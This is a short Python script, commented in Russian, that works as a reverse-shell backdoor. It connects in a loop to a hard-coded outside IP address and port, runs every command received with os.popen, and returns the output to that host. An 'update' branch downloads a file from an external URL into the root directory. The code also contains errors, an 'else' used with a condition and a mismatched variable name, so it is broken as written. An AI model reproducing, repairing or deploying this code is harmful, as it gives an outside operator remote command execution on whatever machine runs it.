import socket
import os
import time
import wget
while True:
    try:
        sock = socket.socket()
        sock.connect(("109.169.239.111", 9696))
        while True:
            try:
                data = sock.recv(1024).decode()  # получаем команду
                aa = os.popen(data)
                result = aa.read()
                if len(result) == 0:
                    sock.send(" ".encode())  # в случае, если рзультат
                else data == "update":
                    sock.send("Updating..".encode())  # в случае, если рзультат
                    URL = 'https://proprikol.ru/wp-content/uploads/2019/11/kartinki-anime-s-ushkami-3.jpg'
                    wget.download(url, '/')
                else:
                    sock.send(result.encode())  # отправляем результат
            except:
                break
    except:
        time.sleep(25)
        continue
